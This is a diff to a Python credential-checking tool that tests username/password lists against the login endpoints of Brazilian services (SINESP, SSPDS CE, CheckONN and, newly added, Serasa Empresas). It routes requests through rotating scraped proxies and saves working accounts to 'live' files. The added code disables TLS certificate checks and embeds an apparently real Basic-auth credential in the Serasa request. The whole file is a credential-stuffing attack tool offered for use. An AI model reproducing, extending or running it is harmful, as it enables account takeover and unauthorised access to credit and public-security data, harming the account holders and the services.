@@ -1,9 +1,31 @@
 #!/usr/bin/env python3
-import requests, sys, os, hashlib, threading, time, random
+import requests, sys, os, hashlib, threading, time, random, ssl
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from bs4 import BeautifulSoup
+from requests.adapters import HTTPAdapter
+from urllib3.util.ssl_ import create_urllib3_context
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+class _LegacyTLSAdapter(HTTPAdapter):
+    """Alguns servidores (ex.: Serasa) recusam o handshake TLS padrão do
+    OpenSSL 3.x (SECLEVEL=2). Baixar pra SECLEVEL=1 resolve o
+    SSLV3_ALERT_HANDSHAKE_FAILURE; check_hostname/verify_mode são
+    desligados aqui para evitar conflito ao usar verify=False."""
+
+    def init_poolmanager(self, *args, **kwargs):
+        ctx = create_urllib3_context(ciphers="DEFAULT@SECLEVEL=1")
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        kwargs["ssl_context"] = ctx
+        return super().init_poolmanager(*args, **kwargs)
+
+    def proxy_manager_for(self, *args, **kwargs):
+        ctx = create_urllib3_context(ciphers="DEFAULT@SECLEVEL=1")
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        kwargs["ssl_context"] = ctx
+        return super().proxy_manager_for(*args, **kwargs)
 
 def _load_proxies(path='proxys.txt'):
     try:
@@ -312,6 +334,29 @@ def check_checkonn(user, pwd):
               or 'Login inválido' in r.text or 'login bloqueado!' in r.text.lower())
     return not is_die and r.status_code == 200, ""
 
+def check_serasa(user, pwd):
+    s = requests.Session()
+    s.mount('https://', _LegacyTLSAdapter())
+    r = s.post(
+        'https://sitenet.serasa.com.br/security/iam/v1/user-identities/login?clientId=5ecebf45aae366236fd0b584',
+        headers={
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'pt-BR,pt;q=0.9',
+            'Authorization': 'Basic NDA5NDEzNDQ6TmVxQDE3NTA=',
+            'Content-Type': 'application/json',
+            'Origin': 'https://empresas.serasaexperian.com.br',
+            'Referer': 'https://empresas.serasaexperian.com.br/',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+        },
+        json={'deviceId': '6a4442efb2b2e725cb1a4551', 'deviceVersion': 'V2'},
+        proxies=_get_proxy(), timeout=15, verify=False,
+    )
+    data  = r.json()
+    token = data.get('accessToken')
+    if token and token != 'null':
+        return True, f"token:{str(token)[:20]}..."
+    return False, ""
+
 # ── proxy manager ──────────────────────────────────────────────────────────────
 _PROXY_FONTES_TXT = [
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=BR&ssl=all&anonymity=all",
@@ -426,6 +471,7 @@ CONFIGS = {
     "7": ("SSPDS CE",      check_sspds,         "live_sspds.txt",         5, 0.3),
     "8":  ("CheckONN",      check_checkonn,      "live_checkonn.txt",      5, 0.3),
     "10": ("SINESP",        check_sinesp,        "live_sinesp.txt",        5, 0.3),
+    "11": ("Serasa Empresas", check_serasa,      "live_serasa.txt",        5, 0.3),
 }
 
 # ── main ───────────────────────────────────────────────────────────────────────
